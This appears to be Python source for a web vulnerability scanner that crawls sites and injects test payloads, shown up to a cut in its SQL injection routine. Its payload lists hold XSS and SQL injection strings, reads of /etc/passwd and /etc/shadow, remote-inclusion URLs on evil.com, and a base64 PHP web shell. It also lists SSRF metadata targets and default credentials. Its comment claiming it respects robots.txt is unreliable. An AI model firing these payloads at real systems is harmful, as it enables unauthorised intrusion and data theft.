
"""
WebSecScanner - Production-Grade Web Vulnerability Scanner

A comprehensive web vulnerability scanner that detects OWASP Top 10 vulnerabilities
and performs extensive security testing on web applications.
"""

import argparse
import asyncio
import base64
import concurrent.futures
import csv
import datetime
import hashlib
import hmac
import json
import logging
import os
import random
import re
import socket
import ssl
import string
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Union

import aiohttp
import dns.resolver
import jinja2
import requests
import tldextract
import urllib3
from bs4 import BeautifulSoup
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from playwright.async_api import async_playwright
from pyppeteer import launch
from rich.console import Console
from rich.progress import Progress, TaskID
from rich.table import Table

# Disable SSL warnings for testing purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Setup logging
LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
logging.basicConfig(
    level=logging.INFO,
    format=LOG_FORMAT,
    handlers=[
        logging.FileHandler("websecscanner.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("WebSecScanner")

# Constants
VERSION = "1.0.0"
USER_AGENT = f"WebSecScanner/{VERSION} (Security Testing)"
DEFAULT_THREADS = 10
DEFAULT_TIMEOUT = 30
DEFAULT_DEPTH = 3
DEFAULT_DELAY = 0.5


class VulnerabilitySeverity(Enum):
    """Enum representing vulnerability severity levels using CVSS."""
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Informational"


@dataclass
class Vulnerability:
    """Class for storing information about detected vulnerabilities."""
    name: str
    url: str
    severity: VulnerabilitySeverity
    description: str
    evidence: str
    remediation: str
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    request_data: Optional[Dict] = None
    response_data: Optional[Dict] = None
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)

    def to_dict(self) -> Dict:
        """Convert vulnerability to dictionary for reporting."""
        return {
            "name": self.name,
            "url": self.url,
            "severity": self.severity.value,
            "description": self.description,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cwe_id": self.cwe_id,
            "cvss_score": self.cvss_score,
            "request_data": self.request_data,
            "response_data": self.response_data,
            "timestamp": self.timestamp.isoformat(),
        }


@dataclass
class ScanTarget:
    """Class containing information about the target being scanned."""
    url: str
    domain: str = field(init=False)
    ip: Optional[str] = None
    server_info: Dict = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    forms: List[Dict] = field(default_factory=list)
    endpoints: Set[str] = field(default_factory=set)
    subdomains: Set[str] = field(default_factory=set)
    cookies: Dict = field(default_factory=dict)
    headers: Dict = field(default_factory=dict)
    
    def __post_init__(self):
        """Extract domain from URL after initialization."""
        parsed_url = urllib.parse.urlparse(self.url)
        extracted = tldextract.extract(parsed_url.netloc)
        self.domain = f"{extracted.domain}.{extracted.suffix}"


class Scanner:
    """Main scanner class that coordinates all scanning operations."""
    
    def __init__(self, 
                 target_url: str, 
                 output_dir: str = "reports", 
                 threads: int = DEFAULT_THREADS,
                 timeout: int = DEFAULT_TIMEOUT,
                 depth: int = DEFAULT_DEPTH,
                 delay: float = DEFAULT_DELAY,
                 user_agent: str = USER_AGENT,
                 cookies: Dict = None,
                 headers: Dict = None,
                 proxy: str = None,
                 verbose: bool = False,
                 scan_subdomains: bool = True,
                 scan_js: bool = True):
        """
        Initialize the scanner with configuration options.
        
        Args:
            target_url: The URL to scan
            output_dir: Directory to save reports
            threads: Number of concurrent threads
            timeout: Request timeout in seconds
            depth: Maximum crawl depth
            delay: Delay between requests in seconds
            user_agent: User agent string to use
            cookies: Custom cookies to include in requests
            headers: Custom headers to include in requests
            proxy: Proxy server to use
            verbose: Enable verbose logging
            scan_subdomains: Whether to scan subdomains
            scan_js: Whether to execute JavaScript during crawling
        """
        self.target = ScanTarget(target_url)
        self.output_dir = output_dir
        self.threads = threads
        self.timeout = timeout
        self.depth = depth
        self.delay = delay
        self.user_agent = user_agent
        self.cookies = cookies or {}
        self.headers = headers or {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }
        self.proxy = proxy
        self.verbose = verbose
        self.scan_subdomains = scan_subdomains
        self.scan_js = scan_js
        
        # Setup proxies if provided
        self.proxies = None
        if proxy:
            self.proxies = {
                "http": proxy,
                "https": proxy
            }
        
        # Session for making requests
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.cookies.update(self.cookies)
        self.session.verify = False  # Disable SSL verification for testing
        if self.proxies:
            self.session.proxies.update(self.proxies)
        
        # Storage for results
        self.visited_urls = set()
        self.vulnerabilities = []
        self.endpoints = set()
        
        # Output directory setup
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Setup console for rich output
        self.console = Console()
        
        # Configure logging level
        if verbose:
            logger.setLevel(logging.DEBUG)
        
        # Load payloads
        self.payloads = self._load_payloads()
        
        logger.info(f"Scanner initialized for target: {target_url}")
    
    def _load_payloads(self) -> Dict:
        """Load predefined and custom payloads for various vulnerability tests."""
        return {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
                "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--"
                "</SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR 1=1 --",
                "\" OR \"\"=\"",
                "\" OR 1=1 --",
                "') OR ('x'='x",
                "'; WAITFOR DELAY '0:0:5' --",
                "1; SELECT pg_sleep(5)",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT username, password, 3 FROM users --"
            ],
            "lfi": [
                "../../../../../../../etc/passwd",
                "../../../../../../../etc/shadow",
                "../../../../../../../windows/win.ini",
                "../../../../../../../boot.ini",
                "/etc/passwd",
                "file:///etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            "rfi": [
                "http://evil.com/shell.php",
                "https://evil.com/shell.php",
                "//evil.com/shell.php",
                "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
            ],
            "command_injection": [
                "& ls -la",
                "; ls -la",
                "| ls -la",
                "$(ls -la)",
                "`ls -la`",
                "&& ls -la",
                "|| ls -la",
                "& ping -c 5 127.0.0.1 &",
                "; ping -c 5 127.0.0.1 ;",
                "| ping -c 5 127.0.0.1 |"
            ],
            "ssrf": [
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
                "http://localhost:8080",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::]:22",
                "http://2130706433:22",  # Decimal representation of 127.0.0.1
                "gopher://127.0.0.1:25/xHELO%20localhost"
            ],
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
                "/\\.evil.com",
                "//google.com@evil.com",
                "https://google.com@evil.com",
                "javascript:alert('Open Redirect')"
            ],
            "crlf": [
                "%0D%0ASet-Cookie: malicious=1",
                "%0D%0AContent-Length: 0",
                "%0D%0A%0D%0A<script>alert('CRLF')</script>",
                "%E5%98%8A%E5%98%8DSet-Cookie: malicious=1",
                "%0D%0ALocation: https://evil.com"
            ],
            "csrf_tokens": [
                "csrftoken",
                "csrf_token",
                "CSRF-Token",
                "XSRF-TOKEN",
                "_csrf",
                "_token",
                "__RequestVerificationToken",
                "authenticity_token"
            ],
            "common_paths": [
                "/admin",
                "/login",
                "/wp-admin",
                "/administrator",
                "/phpinfo.php",
                "/phpmyadmin",
                "/manager/html",
                "/.git/HEAD",
                "/.env",
                "/backup",
                "/wp-config.php",
                "/config.php",
                "/debug",
                "/api",
                "/api/v1",
                "/console",
                "/actuator",
                "/actuator/health",
                "/swagger",
                "/swagger-ui.html"
            ],
            "weak_credentials": [
                {"username": "admin", "password": "admin"},
                {"username": "admin", "password": "password"},
                {"username": "administrator", "password": "administrator"},
                {"username": "root", "password": "root"},
                {"username": "user", "password": "user"},
                {"username": "test", "password": "test"},
                {"username": "guest", "password": "guest"}
            ]
        }
    
    async def start_scan(self):
        """Main method to start the scanning process."""
        start_time = time.time()
        logger.info(f"Starting scan of {self.target.url}")
        
        with Progress() as progress:
            # Initial tasks
            task_recon = progress.add_task("[cyan]Reconnaissance...", total=4)
            
            # Perform initial reconnaissance
            await self._perform_reconnaissance(progress, task_recon)
            
            # Crawl the website
            task_crawl = progress.add_task("[green]Crawling website...", total=100)
            await self._crawl_website(progress, task_crawl)
            
            # Security scanning
            task_scan = progress.add_task("[red]Security scanning...", total=10)
            await self._run_security_scans(progress, task_scan)
        
        # Generate reports
        self._generate_reports()
        
        end_time = time.time()
        logger.info(f"Scan completed in {end_time - start_time:.2f} seconds")
        logger.info(f"Found {len(self.vulnerabilities)} vulnerabilities")
        
        # Print summary
        self._print_summary()
    
    async def _perform_reconnaissance(self, progress, task_id):
        """Gather initial information about the target."""
        logger.info("Starting reconnaissance phase")
        
        # Initial connection to get server info
        progress.update(task_id, advance=1, description="[cyan]Gathering server information...")
        await self._gather_server_info()
        
        # Technology detection
        progress.update(task_id, advance=1, description="[cyan]Detecting technologies...")
        await self._detect_technologies()
        
        # Port scanning (basic)
        progress.update(task_id, advance=1, description="[cyan]Performing basic port scan...")
        await self._scan_common_ports()
        
        # Subdomain enumeration
        if self.scan_subdomains:
            progress.update(task_id, advance=1, description="[cyan]Enumerating subdomains...")
            await self._enumerate_subdomains()
        
        progress.update(task_id, completed=True, description="[cyan]Reconnaissance completed")
    
    async def _gather_server_info(self):
        """Collect basic information about the target server."""
        try:
            response = self.session.get(
                self.target.url, 
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Store response headers
            self.target.headers = dict(response.headers)
            self.target.cookies = dict(response.cookies)
            
            # Extract server information
            server_info = {}
            for header, value in response.headers.items():
                if header.lower() in ["server", "x-powered-by", "x-aspnet-version", "x-runtime"]:
                    server_info[header] = value
            
            self.target.server_info = server_info
            
            # Resolve IP address
            parsed_url = urllib.parse.urlparse(self.target.url)
            try:
                self.target.ip = socket.gethostbyname(parsed_url.netloc)
                logger.info(f"Resolved IP: {self.target.ip}")
            except socket.gaierror:
                logger.warning(f"Could not resolve hostname: {parsed_url.netloc}")
            
            logger.info(f"Server info: {self.target.server_info}")
            
        except requests.RequestException as e:
            logger.error(f"Error gathering server information: {e}")
    
    async def _detect_technologies(self):
        """Detect technologies used by the target website."""
        try:
            response = self.session.get(
                self.target.url, 
                timeout=self.timeout,
                allow_redirects=True
            )
            
            technologies = []
            
            # Check headers for technology clues
            headers = response.headers
            if "X-Powered-By" in headers:
                technologies.append(headers["X-Powered-By"])
            if "Server" in headers:
                technologies.append(headers["Server"])
            
            # Check for common technologies in HTML
            soup = BeautifulSoup(response.text, "html.parser")
            
            # Check for JavaScript frameworks
            js_files = [script.get("src", "") for script in soup.find_all("script", src=True)]
            css_files = [link.get("href", "") for link in soup.find_all("link", rel="stylesheet")]
            
            # Common framework signatures
            framework_signatures = {
                "react": ["react.js", "react.min.js", "react-dom"],
                "angular": ["angular.js", "angular.min.js", "ng-app"],
                "vue": ["vue.js", "vue.min.js"],
                "jquery": ["jquery.js", "jquery.min.js"],
                "bootstrap": ["bootstrap.css", "bootstrap.min.css"],
                "wordpress": ["wp-content", "wp-includes"],
                "drupal": ["drupal.js", "sites/all"],
                "joomla": ["joomla.js", "com_content"],
                "laravel": ["laravel", "csrf-token"],
                "django": ["django", "csrfmiddlewaretoken"],
                "flask": ["flask", "_flashes"],
                "express": ["express", "x-powered-by: express"]
            }
            
            # Check HTML content and files for framework signatures
            for framework, signatures in framework_signatures.items():
                for signature in signatures:
                    if signature in response.text.lower():
                        technologies.append(framework)
                        break
                    for js_file in js_files:
                        if signature in js_file.lower():
                            technologies.append(framework)
                            break
                    for css_file in css_files:
                        if signature in css_file.lower():
                            technologies.append(framework)
                            break
            
            # Check for generator meta tag
            generator = soup.find("meta", attrs={"name": "generator"})
            if generator and generator.get("content"):
                technologies.append(generator.get("content"))
            
            # Remove duplicates
            self.target.technologies = list(set(technologies))
            logger.info(f"Detected technologies: {self.target.technologies}")
            
        except requests.RequestException as e:
            logger.error(f"Error detecting technologies: {e}")
    
    async def _scan_common_ports(self):
        """Scan common ports on the target server."""
        if not self.target.ip:
            logger.warning("IP address not resolved, skipping port scan")
            return
        
        # List of common ports to scan
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        open_ports = []
        
        # Use asyncio for faster port scanning
        async def scan_port(port):
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target.ip, port),
                    timeout=2
                )
                writer.close()
                await writer.wait_closed()
                return port
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                return None
        
        # Scan ports concurrently
        tasks = [scan_port(port) for port in common_ports]
        results = await asyncio.gather(*tasks)
        
        # Filter out None results
        open_ports = [port for port in results if port is not None]
        
        self.target.open_ports = open_ports
        logger.info(f"Open ports: {self.target.open_ports}")
    
    async def _enumerate_subdomains(self):
        """Enumerate subdomains of the target domain."""
        subdomains = set()
        
        # Use DNS resolution to find subdomains
        try:
            # Common subdomain prefixes
            common_subdomains = [
                "www", "mail", "ftp", "smtp", "pop", "ns1", "ns2", "dns", "dns1", "dns2",
                "mx", "mx1", "mx2", "webmail", "remote", "blog", "server", "admin", "vpn",
                "dev", "test", "portal", "api", "uat", "stage", "staging", "shop", "store",
                "support", "help", "apps", "app", "m", "mobile", "files", "forms"
            ]
            
            # Try resolving common subdomains
            for subdomain in common_subdomains:
                try:
                    hostname = f"{subdomain}.{self.target.domain}"
                    await asyncio.to_thread(socket.gethostbyname, hostname)
                    subdomains.add(hostname)
                    logger.debug(f"Found subdomain: {hostname}")
                except socket.gaierror:
                    pass
        
        except Exception as e:
            logger.error(f"Error enumerating subdomains: {e}")
        
        self.target.subdomains = subdomains
        logger.info(f"Found {len(subdomains)} subdomains")
    
    async def _crawl_website(self, progress, task_id):
        """Crawl the website to discover endpoints and forms."""
        logger.info("Starting website crawling")
        
        # Initialize crawl variables
        to_visit = {self.target.url}
        visited = set()
        current_depth = 0
        
        # Track forms found during crawling
        forms = []
        
        progress.update(task_id, completed=0, total=len(to_visit))
        
        # Use playwright for JavaScript-enabled crawling if requested
        if self.scan_js:
            await self._js_enabled_crawl(to_visit, visited, forms, progress, task_id)
        else:
            await self._basic_crawl(to_visit, visited, forms, progress, task_id)
        
        # Store discovered endpoints and forms
        self.endpoints = visited
        self.target.endpoints = visited
        self.target.forms = forms
        
        logger.info(f"Crawling completed. Found {len(visited)} endpoints and {len(forms)} forms")
        progress.update(task_id, completed=True, description="[green]Crawling completed")
    
    async def _basic_crawl(self, to_visit, visited, forms, progress, task_id):
        """Basic crawling without JavaScript execution."""
        while to_visit and len(visited) < 1000:  # Limit to prevent infinite crawling
            current_url = to_visit.pop()
            
            if current_url in visited:
                continue
            
            visited.add(current_url)
            progress.update(task_id, advance=1, description=f"[green]Crawling: {len(visited)} URLs found")
            
            try:
                response = self.session.get(
                    current_url,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Respect robots.txt
                if response.status_code == 200 and "text/html" in response.headers.get("Content-Type", ""):
                    soup = BeautifulSoup(response.text, "html.parser")
                    
                    # Extract links
                    for a_tag in soup.find_all("a", href=True):
                        href = a_tag["href"]
                        next_url = urllib.parse.urljoin(current_url, href)
                        
                        # Only follow links to the same domain
                        if self._is_same_domain(next_url, self.target.url):
                            to_visit.add(next_url)
                    
                    # Extract forms
                    for form in soup.find_all("form"):
                        form_data = self._extract_form_data(form, current_url)
                        if form_data:
                            forms.append(form_data)
                
                # Sleep to avoid overloading the server
                await asyncio.sleep(self.delay)
                
            except requests.RequestException as e:
                logger.debug(f"Error crawling {current_url}: {e}")
            
            # Update progress
            progress.update(task_id, total=len(visited) + len(to_visit))
    
    async def _js_enabled_crawl(self, to_visit, visited, forms, progress, task_id):
        """Advanced crawling with JavaScript execution using Playwright."""
        try:
            # Start playwright
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    user_agent=self.user_agent,
                    ignore_https_errors=True
                )
                
                # Set cookies if available
                if self.cookies:
                    for name, value in self.cookies.items():
                        await context.add_cookies([{
                            "name": name,
                            "value": value,
                            "url": self.target.url
                        }])
                
                page = await context.new_page()
                
                # Set request headers
                await page.set_extra_http_headers(self.headers)
                
                # Crawl with a limited number of pages to prevent infinite crawling
                max_pages = 100
                crawled = 0
                
                while to_visit and crawled < max_pages:
                    current_url = to_visit.pop()
                    
                    if current_url in visited:
                        continue
                    
                    visited.add(current_url)
                    crawled += 1
                    
                    progress.update(task_id, advance=1, description=f"[green]JS Crawling: {len(visited)} URLs found")
                    
                    try:
                        # Navigate to the page
                        await page.goto(current_url, timeout=self.timeout * 1000, wait_until="networkidle")
                        
                        # Extract links after JavaScript execution
                        links = await page.evaluate("""
                            () => {
                                const links = Array.from(document.querySelectorAll('a[href]'))
                                    .map(a => a.href);
                                return [...new Set(links)];
                            }
                        """)
                        
                        # Add links to visit queue
                        for link in links:
                            if self._is_same_domain(link, self.target.url):
                                to_visit.add(link)
                        
                        # Extract forms
                        form_elements = await page.query_selector_all("form")
                        for form_element in form_elements:
                            # Get form action
                            action = await form_element.get_attribute("action") or ""
                            method = await form_element.get_attribute("method") or "get"
                            
                            # Get form inputs
                            inputs = await form_element.query_selector_all("input, textarea, select")
                            input_data = []
                            
                            for input_el in inputs:
                                input_type = await input_el.get_attribute("type") or "text"
                                input_name = await input_el.get_attribute("name")
                                
                                if input_name:
                                    input_data.append({
                                        "name": input_name,
                                        "type": input_type
                                    })
                            
                            form_url = urllib.parse.urljoin(current_url, action)
                            forms.append({
                                "url": form_url,
                                "method": method.upper(),
                                "inputs": input_data
                            })
                        
                        # Sleep to avoid overloading the server
                        await asyncio.sleep(self.delay)
                        
                    except Exception as e:
                        logger.debug(f"Error JS crawling {current_url}: {e}")
                    
                    # Update progress
                    progress.update(task_id, total=len(visited) + len(to_visit))
                
                # Close browser
                await browser.close()
                
        except Exception as e:
            logger.error(f"Error during JavaScript-enabled crawling: {e}")
            # Fall back to basic crawling
            logger.info("Falling back to basic crawling")
            await self._basic_crawl(to_visit, visited, forms, progress, task_id)
    
    def _extract_form_data(self, form, page_url):
        """Extract data from a form element."""
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        
        # Get absolute URL for form submission
        form_url = urllib.parse.urljoin(page_url, action)
        
        # Extract input fields
        inputs = []
        for input_tag in form.find_all(["input", "textarea", "select"]):
            input_name = input_tag.get("name")
            if input_name:
                inputs.append({
                    "name": input_name,
                    "type": input_tag.get("type", "text"),
                    "value": input_tag.get("value", "")
                })
        
        return {
            "url": form_url,
            "method": method,
            "inputs": inputs
        }
    
    def _is_same_domain(self, url, base_url):
        """Check if a URL belongs to the same domain as the base URL."""
        try:
            parsed_url = urllib.parse.urlparse(url)
            parsed_base = urllib.parse.urlparse(base_url)
            
            # Check for javascript: or data: URLs
            if parsed_url.scheme in ["javascript", "data", "mailto", "tel"]:
                return False
            
            # Check for fragment-only URLs
            if not parsed_url.netloc and not parsed_url.path and parsed_url.fragment:
                return False
            
            # Handle relative URLs
            if not parsed_url.netloc:
                return True
            
            # Compare domains
            url_domain = tldextract.extract(parsed_url.netloc)
            base_domain = tldextract.extract(parsed_base.netloc)
            
            return url_domain.domain == base_domain.domain and url_domain.suffix == base_domain.suffix
            
        except Exception:
            return False
    
    async def _run_security_scans(self, progress, task_id):
        """Run all security scans on the target."""
        logger.info("Starting security scans")
        
        # Create a list of scan tasks
        scan_methods = [
            self._scan_xss,
            self._scan_sqli,
            self._scan_csrf,
            self._scan_security_headers,
            self._scan_session_security,
            self._scan_authentication,
            self._scan_information_disclosure,
            self._scan_ssrf,
            self._scan_directory_traversal,
            self._scan_api_security
        ]
        
        # Update progress
        progress.update(task_id, total=len(scan_methods))
        
        # Run scans sequentially (could be parallelized, but sequential is safer)
        for scan_method in scan_methods:
            scan_name = scan_method.__name__.replace("_scan_", "")
            progress.update(task_id, advance=1, description=f"[red]Running {scan_name} scan...")
            await scan_method(progress)
        
        progress.update(task_id, completed=True, description="[red]Security scanning completed")
        logger.info("Security scans completed")
    
    async def _scan_xss(self, progress):
        """Scan for Cross-Site Scripting (XSS) vulnerabilities."""
        logger.info("Scanning for XSS vulnerabilities")
        
        # Test forms for XSS
        for form in self.target.forms:
            await self._test_form_xss(form)
        
        # Test URL parameters for reflected XSS
        await self._test_url_param_xss()
    
    async def _test_form_xss(self, form):
        """Test a form for XSS vulnerabilities."""
        form_url = form["url"]
        method = form["method"]
        inputs = form["inputs"]
        
        # Skip forms without inputs
        if not inputs:
            return
        
        # Prepare payloads for each input field
        for input_field in inputs:
            # Skip non-text inputs
            if input_field.get("type") in ["file", "image", "submit", "button", "hidden"]:
                continue
            
            input_name = input_field["name"]
            
            # Test each XSS payload
            for payload in self.payloads["xss"]:
                form_data = {}
                
                # Fill form with benign data
                for field in inputs:
                    field_name = field["name"]
                    field_type = field.get("type", "text")
                    
                    if field_name == input_name:
                        form_data[field_name] = payload
                    elif field_type == "email":
                        form_data[field_name] = "test@example.com"
                    elif field_type == "password":
                        form_data[field_name] = "password123"
                    else:
                        form_data[field_name] = "test"
                
                try:
                    # Send request based on form method
                    if method == "GET":
                        response = self.session.get(
                            form_url,
                            params=form_data,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    else:  # POST
                        response = self.session.post(
                            form_url,
                            data=form_data,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    
                    # Check if the payload is reflected
                    if payload in response.text:
                        # Check if the payload might be executed
                        soup = BeautifulSoup(response.text, "html.parser")
                        scripts = soup.find_all("script")
                        
                        # Basic XSS detection - payload appears in response
                        if any(payload in str(script) for script in scripts) or \
                           payload in response.text and "<" in payload and ">" in payload:
                            self._add_vulnerability(
                                name="Cross-Site Scripting (XSS)",
                                url=form_url,
                                severity=VulnerabilitySeverity.HIGH,
                                description="XSS vulnerability detected in form input.",
                                evidence=f"Form parameter '{input_name}' reflects XSS payload: {payload}",
                                remediation="Implement proper input validation, output encoding, and use Content-Security-Policy.",
                                cwe_id="CWE-79",
                                cvss_score=6.1,
                                request_data={"url": form_url, "method": method, "data": form_data},
                                response_data={"status": response.status_code, "headers": dict(response.headers)}
                            )
                            # Move to next input after finding vulnerability
                            break
                
                except requests.RequestException as e:
                    logger.debug(f"Error testing XSS in form {form_url}: {e}")
                
                # Add delay between requests
                await asyncio.sleep(self.delay)
    
    async def _test_url_param_xss(self):
        """Test URL parameters for reflected XSS vulnerabilities."""
        # Collect URLs with parameters
        param_urls = set()
        for url in self.endpoints:
            parsed = urllib.parse.urlparse(url)
            if parsed.query:
                param_urls.add(url)
        
        # Test each URL with parameters
        for url in param_urls:
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            # Test each parameter with XSS payloads
            for param_name, param_values in query_params.items():
                for payload in self.payloads["xss"]:
                    # Clone the original parameters and modify the current one
                    test_params = dict(query_params)
                    test_params[param_name] = [payload]
                    
                    # Rebuild the URL with modified parameters
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    try:
                        response = self.session.get(
                            test_url,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                        
                        # Check if the payload is reflected
                        if payload in response.text:
                            # Basic detection - check if payload might be executed
                            if "<script>" in payload and "</script>" in payload and f"{payload}" in response.text:
                                self._add_vulnerability(
                                    name="Reflected Cross-Site Scripting (XSS)",
                                    url=test_url,
                                    severity=VulnerabilitySeverity.HIGH,
                                    description="Reflected XSS vulnerability detected in URL parameter.",
                                    evidence=f"URL parameter '{param_name}' reflects XSS payload: {payload}",
                                    remediation="Implement proper input validation, output encoding, and use Content-Security-Policy.",
                                    cwe_id="CWE-79",
                                    cvss_score=6.1,
                                    request_data={"url": test_url, "method": "GET"},
                                    response_data={"status": response.status_code, "headers": dict(response.headers)}
                                )
                                # Move to next parameter after finding vulnerability
                                break
                    
                    except requests.RequestException as e:
                        logger.debug(f"Error testing XSS in URL {test_url}: {e}")
                    
                    # Add delay between requests
                    await asyncio.sleep(self.delay)
    
    async def _scan_sqli(self, progress):
        """Scan for SQL Injection vulnerabilities."""
        logger.info("Scanning for SQL Injection vulnerabilities")
        
        # Test forms for SQLi
        for form in self.target.forms:
            await self._test_form_sqli(form)
        
        # Test URL parameters for SQLi
        await self._test_url_param_sqli()
    
    async def _test_form_sqli(self, form):
        """Test a form for SQL Injection vulnerabilities."""
        form_url = form["url"]
        method = form["method"]
        inputs = form["inputs"]
        
        # Skip forms without inputs
        if not inputs:
            return
        
        # Prepare SQLi payloads for each input field
        for input_field in inputs:
            # Skip non-text inputs
            if input_field.get("type") in ["file", "image", "submit", "button"]:
                continue
            
            input_name = input_field["name"]
            
            # Test each SQLi payload
            for payload in self.payloads["sqli"]:
                form_data = {}
                
                # Fill form with benign data
                for field in inputs:
                    field_name = field["name"]
                    field_type = field.get("type", "text")
                    
                    if field_name == input_name:
                        form_data[field_name] = payload
                    elif field_type == "email":
                        form_data[field_name] = "test@example.com"
                    elif field_type == "password":
                        form_data[field_name] = "password123"
                    else:
                        form_data[field_name] = "test"
                
                try:
                    # Send normal request first to establish baseline
                    baseline_data = form_data.copy()
                    baseline_data[input_name] = "normal_value"
                    
                    if method == "GET":
                        baseline_resp = self.session.get(
                            form_url,
                            params=baseline_data,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    else:  # POST
                        baseline_resp = self.session.post(
                            form_url,
                            data=baseline_data,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    
                    # Now send the SQLi payload
                    if method == "GET":
                        response = self.session.get(
                            form_url,
                            params=form_data,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    else:  # POST
                        response = self.session.post(
                            form_url,
                            data=form_data,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    
                    # Look for SQL error patterns in the response
                    sql_error_patterns = [
                        "SQL syntax",
                        "mysql_fetch_array",
                        "You have an error in your SQL syntax",
                        "ORA-01756",
                        "ORA-00933",
                        "Microsoft SQL Native Client error",
                        "ODBC Driver",
                        "SQLite3::query",
                        "PostgreSQL",
                        "mysql_numrows()",
                        "mysqli_fetch_assoc()"
                    ]
                    
                    # Check for SQL errors or significant response differences
                    sql_error_detected = any(pattern.lower() in response.text.lower() for pattern in sql_error_patterns)
                    
                    # Time-based detection (this is simple and may have false positives)
                    is_time_based = "sleep" in payload.lower() or "delay" in payload.lower() or "waitfor" in payload.lower()
                    
                    # Boolean-based detection
                    # If payload contains true condition ('1'='1') vs baseline, the page might be different
                    if sql_error_detected or \
                       (is_time_based and response.elapsed.total_seconds() > 5) or \
                       (baseline_resp.status_code != response.status_code) or \
                       (abs(len(baseline_resp.text) - len(response.text)) > 50):
                        
                        self._add_vulnerability(
                            name="SQL Injection",
                            url=form_url,
                            severity=VulnerabilitySeverity.CRITICAL,
                            description="Potential SQL Injection vulnerability detected in form input.",
                            evidence=f"Form parameter '{input_name}' might be vulnerable to SQL injection with payload: {payload}",
                            remediation="Use parameterized queries, prepared statements, or ORMs. Implement input validation and use least privilege database accounts.",
                            cwe_id="CWE-89",
                            cvss_score=8.5,
                            request_data={"url": form_url, "method": method, "data": form_data},
                            response_data={"status": response.status_code, "headers": dict(response.headers)}
                        )
                        # Move to next input after finding vulnerability
                        break
                
                except requests.RequestException as e:
                    logger.debug(f"Error testing SQLi in form {form_url}: {e}")
                
                # Add delay between requests
                await asyncio.sleep(self.delay)
    
    async def _test_url_param_sqli(self):
        """Test URL parameters for SQL Injection vulnerabilities."""
        # Collect URLs with parameters
        param_urls = set()
        for url in self.endpoints:
            parsed = urllib.parse.urlparse(url)
            if parsed.query:
                param_urls.add(url)
        
        # Test each URL with parameters
        for url in param_urls:
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            # Test each parameter with SQLi payloads
            for param_name, param_values in query_params.items():
                for payload in self.payloads["sqli"]:
                    # Clone the original parameters and modify the current one
                    test_params = dict(query_params)
                    test_params[param_name] = [payload]
                    
                    # Rebuild the URL with modified parameters
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    # Also create a baseline URL for comparison
                    baseline_params = dict(query_params)
                    baseline_params[param_name] = ["normal_value"]
                    baseline_query = urllib.parse.urlencode(baseline_params, doseq=True)
                    baseline_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, baseline_query, parsed.fragment
                    ))
                    
                    try:
                        # Get baseline response
                        baseline_resp = self.session.get(
                            baseline_url,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                        
                        # Get test response
                        response = self.session.get(
                            test_url,
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                        
                        # Look for SQL error patterns in the response
                        sql_error_patterns = [
                            "SQL syntax",
                            "mysql_fetch_array",
                            "You have an error in your SQL syntax",
                            "ORA-01756",
                            "ORA-00933",
                            "Microsoft SQL Native Client error",
                            "ODBC Driver",
